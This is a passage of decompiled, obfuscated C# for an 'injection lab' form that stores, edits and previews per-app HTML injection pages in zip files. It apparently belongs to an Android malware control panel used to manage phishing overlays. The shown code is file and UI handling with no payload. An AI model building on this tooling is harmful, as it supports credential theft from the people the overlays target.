			delsbtn1.Text = EXGuarder._672A314B;
			delallbtn.Text = EXGuarder._5D5E2107;
			addnbtn.Text = EXGuarder._5F74690B;
			BTtiptool.SetToolTip(savebtn, EXGuarder._4F78191F);
			BTtiptool.SetToolTip(prevbtn, EXGuarder._11487929);
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._50480C1E, TextCompare: false))
		{
			searchtext.Watermark = EXGuarder._77374606;
			delsbtn1.Text = EXGuarder._78250204;
			delallbtn.Text = EXGuarder._6E5C0773;
			addnbtn.Text = EXGuarder._622B0512;
			BTtiptool.SetToolTip(savebtn, EXGuarder._46002538);
			BTtiptool.SetToolTip(prevbtn, EXGuarder._24482F3D);
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._460D782E, TextCompare: false))
		{
			searchtext.Watermark = EXGuarder._2918200D;
			delsbtn1.Text = EXGuarder._42472317;
			delallbtn.Text = EXGuarder._3E630D2B;
			addnbtn.Text = EXGuarder._4D6A1C70;
			BTtiptool.SetToolTip(savebtn, EXGuarder._61276A02);
			BTtiptool.SetToolTip(prevbtn, EXGuarder._74191302);
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._2C1E4B40, TextCompare: false))
		{
			searchtext.Watermark = EXGuarder._57355C04;
			delsbtn1.Text = EXGuarder._2D345472;
			delallbtn.Text = EXGuarder._47193F53;
			addnbtn.Text = EXGuarder._4C487370;
			BTtiptool.SetToolTip(savebtn, EXGuarder._051D0B2B);
			BTtiptool.SetToolTip(prevbtn, EXGuarder._6C543D18);
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._76295E0D, TextCompare: false))
		{
			searchtext.Watermark = EXGuarder._4F321158;
			delsbtn1.Text = EXGuarder._03537826;
			delallbtn.Text = EXGuarder._66426C2C;
			addnbtn.Text = EXGuarder._64791317;
			BTtiptool.SetToolTip(savebtn, EXGuarder._415E5D65);
			BTtiptool.SetToolTip(prevbtn, EXGuarder._33137459);
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._200E3979, TextCompare: false))
		{
			searchtext.Watermark = EXGuarder._4F321158;
			delsbtn1.Text = EXGuarder._71180C24;
			delallbtn.Text = EXGuarder._76396150;
			addnbtn.Text = EXGuarder._0C2D1344;
			BTtiptool.SetToolTip(savebtn, EXGuarder._03297145);
			BTtiptool.SetToolTip(prevbtn, EXGuarder._33137459);
		}
	}

	private async void jectslist_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (jectslist.SelectedItem == null)
		{
			return;
		}
		string text = MyRes.injections_Path + $"\\{jectslist.SelectedItem.ToString()}.zip";
		if (File.Exists(text))
		{
			string text2 = codes.ExtractHtmlFromZip(text);
			if (text2 == null)
			{
				BTAlerter.erroes(BTConst.nohtfindstr);
				return;
			}
			skipchange = true;
			fctb.Text = text2;
			await jectview.EnsureCoreWebView2Async();
			jectview.NavigateToString(text2);
			jectview.Visible = true;
		}
	}

	private void prevbtn_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(prevbtn.Tag.ToString(), EXGuarder._753D3A6B, TextCompare: false) == 0)
		{
			jectview.Visible = false;
			prevbtn.Tag = EXGuarder._12040E69;
		}
		else
		{
			jectview.Visible = true;
			prevbtn.Tag = EXGuarder._753D3A6B;
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (jectslist.Items.Count <= 0)
		{
			return;
		}
		if (jectslist.SelectedItem == null)
		{
			BTAlerter.infos(BTConst.slctidstr);
			return;
		}
		string path = MyRes.injections_Path + string.Format(EXGuarder._180B354E, jectslist.SelectedItem.ToString());
		if (File.Exists(path) && MyMsg.Show(BTConst.delfilstr, string.Format(EXGuarder._5E513E5B, BTConst.surdelestr, EXGuarder._6B780708, jectslist.SelectedItem.ToString()), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._75332A31) == DialogResult.OK)
		{
			File.Delete(path);
			jectslist.Items.RemoveAt(jectslist.SelectedIndex);
			fctb.Text = EXGuarder._75332A31;
			jectview.CoreWebView2.Navigate(EXGuarder._32274644);
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		try
		{
			if (jectslist.Items.Count > 0)
			{
				if (jectslist.SelectedItem == null)
				{
					BTAlerter.infos(BTConst.slctidstr);
				}
				else if (MyMsg.Show(BTConst.confirmstr, string.Format(EXGuarder._0F6A0323, BTConst.svchngstr, EXGuarder._72185622, jectslist.SelectedItem.ToString()), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._2B163263) == DialogResult.OK)
				{
					string content = fctb.Text;
					string text = codes.Createtemp(content);
					string destinationZipPath = MyRes.injections_Path + string.Format(EXGuarder._3D415258, jectslist.SelectedItem.ToString());
					codes.ZipJectFile(text, destinationZipPath, string.Format(EXGuarder._5B6E0B22, jectslist.SelectedItem.ToString()));
					File.Delete(text);
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = EXGuarder._4F6A6961;
			openFileDialog.Title = BTConst.slcthtmstr;
			openFileDialog.CheckFileExists = true;
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string fileName = openFileDialog.FileName;
			string appId;
			while (true)
			{
				 appId = EXGuarder._55441821;
				myinputs myinputs2 = new myinputs();
				myinputs2.msgtitle.Text = BTConst.tappidstr;
				myinputs2.inputtext.Text = EXGuarder._55441821;
				myinputs2.inputtext.Watermark = EXGuarder._240E674D;
				if (myinputs2.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				 appId = myinputs2.inputtext.Text;
				if (!codes.StrisEmpty(appId))
				{
					break;
				}
				BTAlerter.infos(BTConst.slctidstr);
			}
			string destinationZipPath = MyRes.injections_Path + string.Format(EXGuarder._66232A76, appId);
			codes.ZipJectFile(fileName, destinationZipPath, string.Format(EXGuarder._1E427711, appId));
			int selectedIndex = jectslist.Items.Add(appId);
			jectslist.SelectedIndex = selectedIndex;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.confirmstr, string.Format(EXGuarder._401A0A43, BTConst.delallvstr), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._481F5353) != DialogResult.OK)
		{
			return;
		}
		string injections_Path = MyRes.injections_Path;
		if (Directory.Exists(injections_Path))
		{
			try
			{
				Directory.Delete(injections_Path, recursive: true);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(EXGuarder._17361F74 + ex2.Message);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Directory.CreateDirectory(injections_Path);
	}

	private void searchtext_TextChanged(object sender, EventArgs e)
	{
		searchDelayTimer.Stop();
		searchDelayTimer.Start();
	}

	private void PerformSearch(object sender, EventArgs e)
	{
		searchDelayTimer.Stop();
		string value = searchtext.Text.Trim().ToLower();
		if (string.IsNullOrEmpty(value) || jectslist.Items.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = jectslist.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = jectslist.Items[i].ToString().ToLower();
				if (text.Contains(value))
				{
					jectslist.SelectedIndex = i;
					break;
				}
			}
		}
	}

	private async void UpdatePreview(object sender, EventArgs e)
	{
		updatePreviewTimer.Stop();
		string text = fctb.Text;
		if (!string.IsNullOrWhiteSpace(text))
		{
			await jectview.EnsureCoreWebView2Async();
			jectview.NavigateToString(text);
		}
	}

	private void reflect()
	{
		if (skipchange)
		{
			skipchange = false;
			return;
		}
		updatePreviewTimer.Stop();
		updatePreviewTimer.Start();
	}

	private void ijectionlab_Load(object sender, EventArgs e)
	{
		searchDelayTimer.Tick += PerformSearch;
		updatePreviewTimer.Tick += UpdatePreview;
		fctb = new FastColoredTextBox();
		fctb.Dock = DockStyle.Fill;
		fctb.Language = Language.HTML;
		fctb.Font = new Font(EXGuarder._782A693C, 12f);
		fctb.BackColor = Color.FromArgb(30, 30, 30);
		fctb.ForeColor = Color.Gainsboro;
		fctb.Font = new Font(EXGuarder._782A693C, 10f);
		fctb.Language = Language.Custom;
		fctb.ClearStylesBuffer();
		fctb.AllowSeveralTextStyleDrawing = false;
		fctb.LeftPadding = 15;
		tagStyle = new TextStyle(Brushes.DeepSkyBlue, null, FontStyle.Regular);
		attrNameStyle = new TextStyle(Brushes.LightSkyBlue, null, FontStyle.Regular);
		attrValueStyle = new TextStyle(Brushes.SandyBrown, null, FontStyle.Regular);
		tagBracketStyle = new TextStyle(new SolidBrush(Color.DimGray), null, FontStyle.Regular);
		contentTextStyle = new TextStyle(Brushes.Gainsboro, null, FontStyle.Regular);
		jsFunctionStyle = new TextStyle(Brushes.Gold, null, FontStyle.Regular);
		cssSelectorStyle = new TextStyle(Brushes.Gold, null, FontStyle.Regular);
		commentStyle = new TextStyle(Brushes.DarkSeaGreen, null, FontStyle.Italic);
		fctb.AddStyle(tagStyle);
		fctb.AddStyle(attrNameStyle);
		fctb.AddStyle(attrValueStyle);
		fctb.AddStyle(tagBracketStyle);
		fctb.AddStyle(contentTextStyle);
		fctb.AddStyle(jsFunctionStyle);
		fctb.AddStyle(cssSelectorStyle);
		fctb.AddStyle(commentStyle);
		fctb.TextChangedDelayed += ApplyHighlighting;
		fctb.Text = EXGuarder._561B1823;
		fctb.TextChanged += [SpecialName] [DebuggerHidden] (object a0, TextChangedEventArgs a1) =>
		{
			reflect();
		};
		ResizeableControl resizeableControl = new ResizeableControl(jectview);
		resizeableControl.AllowedEdge = ResizeableControl.EdgeEnum.Left;
		Panel4.Controls.Add(fctb);
		codes.SetDoubleBuffered(fctb);
		translateme();
	}

	private void ApplyHighlighting(object sender, EventArgs e)
	{
		Range range = fctb.Range;
		range.ClearStyle(tagStyle, attrNameStyle, attrValueStyle, tagBracketStyle, contentTextStyle, jsFunctionStyle, cssSelectorStyle, commentStyle);
		range.SetStyle(tagBracketStyle, EXGuarder._62796B40);
		range.SetStyle(tagStyle, EXGuarder._1D386509);
		range.SetStyle(attrNameStyle, EXGuarder._73561F65);
		range.SetStyle(attrValueStyle, EXGuarder._11340B6A);
		range.SetStyle(contentTextStyle, EXGuarder._2349183C);
		range.SetStyle(jsFunctionStyle, EXGuarder._520C1339);
		range.SetStyle(cssSelectorStyle, EXGuarder._49626C41);
		range.SetStyle(commentStyle, EXGuarder._65305969, RegexOptions.Singleline);
	}
}
